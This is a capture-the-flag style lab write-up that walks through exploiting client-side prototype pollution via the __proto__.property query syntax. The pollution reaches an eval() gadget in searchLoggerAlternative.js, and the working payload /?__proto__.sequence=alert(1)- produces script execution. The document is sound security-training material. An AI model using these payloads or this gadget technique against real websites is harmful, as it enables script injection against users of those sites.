Reconnaissance
1. Testing the initial prototype pollution vector

The first payload tested was:

/?__proto__[foo]=bar

After loading the URL, the following was executed in the browser console:

Object.prototype

The foo property was not present.

Therefore, this prototype pollution vector was not effective in this lab.

Identifying an alternative pollution source

A second prototype pollution syntax was tested:

/?__proto__.foo=bar

The browser console was then used again:

Object.prototype

This time the object contained:

foo: "bar"

This confirmed that the application was vulnerable to prototype pollution through the __proto__.property=value query-string syntax.

The vulnerable source was therefore:

__proto__.property=value
Identifying the gadget

The JavaScript source files loaded by the application were inspected through:

DevTools → Sources

The relevant file was:

searchLoggerAlternative.js

The following code was identified:

async function searchLogger() {
    window.macros = {};
    window.manager = {
        params: $.parseParams(new URL(location)),
        macro(property) {
            if (window.macros.hasOwnProperty(property))
                return macros[property]
        }
    };

    let a = manager.sequence || 1;
    manager.sequence = a + 1;

    eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');

    if(manager.params && manager.params.search) {
        await logQuery('/logger', manager.params);
    }
}

The important part is:

let a = manager.sequence || 1;
manager.sequence = a + 1;

followed by:

eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');

The manager object does not initially define a sequence property.

Because JavaScript objects inherit properties from Object.prototype, a polluted property can be inherited by manager.

Understanding the gadget

The following relationship is important:

manager.sequence

If sequence does not exist directly on manager, JavaScript searches its prototype chain.

Therefore, after prototype pollution:

Object.prototype.sequence = "alert(1)"

the following becomes possible:

manager.sequence

which resolves to:

alert(1)

The value is then incorporated into the eval() expression.

Initial exploit attempt

The following payload was tested:

/?__proto__.sequence=alert(1)

However, the payload did not immediately execute.

The browser console reported a JavaScript syntax error:

Uncaught (in promise) SyntaxError:
missing ) after argument list

The error pointed to:

searchLoggerAlternative.js

and specifically to the line containing the eval() call.

Debugging the gadget

A breakpoint was placed on the line:

eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');

After refreshing the page, inspection of:

manager.sequence

showed that the value was effectively being transformed into:

alert(1)1

This happened because of:

let a = manager.sequence || 1;
manager.sequence = a + 1;

The polluted value:

alert(1)

was therefore modified to:

alert(1)1

This resulted in invalid JavaScript syntax when inserted into the eval() expression.

Bypassing the value modification

To compensate for the numeric character appended by the gadget, a trailing minus character was added to the payload.

Final payload:

/?__proto__.sequence=alert(1)-

The gadget then effectively produced a JavaScript expression equivalent to:

alert(1)-1

which is syntactically valid JavaScript.

The alert(1) function therefore executes successfully.

Final exploit

The final URL parameter was:

__proto__.sequence=alert(1)-

Resulting URL structure:

/?__proto__.sequence=alert(1)-

When the page loaded, the following occurred:

URL parameter
      ↓
__proto__.sequence
      ↓
Object.prototype.sequence
      ↓
manager.sequence
      ↓
manager.sequence = a + 1
      ↓
alert(1)-
      ↓
eval()
      ↓
alert(1)

The browser displayed:

Alert: 1

and the lab was marked as solved.

Technical explanation

The vulnerability exists because user-controlled URL parameters are parsed into properties that can modify the global prototype:

__proto__.sequence=alert(1)-

This effectively introduces the property into:

Object.prototype

Objects inheriting from Object.prototype can subsequently access this property.

The application creates:

window.manager = {
    params: ...,
    macro(property) {
        ...
    }
};

Although manager does not explicitly contain:

sequence

the expression:

manager.sequence

can resolve the polluted prototype property.

The application then performs:

let a = manager.sequence || 1;
manager.sequence = a + 1;

and eventually passes the resulting value into:

eval()

This converts the prototype pollution primitive into a JavaScript execution primitive.

